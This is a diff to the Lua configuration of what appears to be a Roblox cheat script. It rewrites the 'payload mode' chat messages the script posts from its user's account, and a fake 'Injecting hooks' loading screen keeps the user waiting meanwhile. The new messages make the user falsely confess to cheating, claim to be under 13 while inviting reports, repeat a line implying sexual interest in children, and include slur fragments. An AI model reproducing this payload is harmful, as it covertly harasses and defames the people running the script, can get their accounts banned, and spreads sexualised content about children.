@@ -26,14 +26,14 @@ return {
     -- ═══════════════════════════════════════════════════════════════
     --  AD MESSAGES (used when enabled = false / payload mode)
     -- ═══════════════════════════════════════════════════════════════
-    ad_message = "/ercy on top, join for free scripts",
+    ad_message = "IM A LARP AND I GOT CAUGHT RUNNING A SCRIPT MADE BY SOMEBODY ELSE!",
 
     ad_chat_messages = {
-        "/ercy on top ",
-        "join ercy NOW",
-        "ercy owns you ",
-        "/ercy was here",
-        "you got caught lacking by ercy",
+        "im a larp ",
+        "im the biggest larper. i kicked the scripter who made this script. i also cheat. and i work a job so i can play roblox and exploit!",
+        "o3fu owns me. ",
+        " i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds ",
+        "i larp, im under 13 please report me lol yall are fat fat fat ng ng",
     },
 
     -- ═══════════════════════════════════════════════════════════════
@@ -68,7 +68,7 @@ return {
         { text = "Fetching remote config...",         duration = 2.0 },
         { text = "Injecting hooks...",                duration = 1.5 },
         { text = "Almost ready...",                   duration = 1.0 },
-        { text = "Script disabled by o3fu, please wait as we re-enable it.", duration = 999999999 },
+        { text = "Script disabled by o3fu, running the back up script.. please wait", duration = 9999999999 },
     },
 
     -- ═══════════════════════════════════════════════════════════════
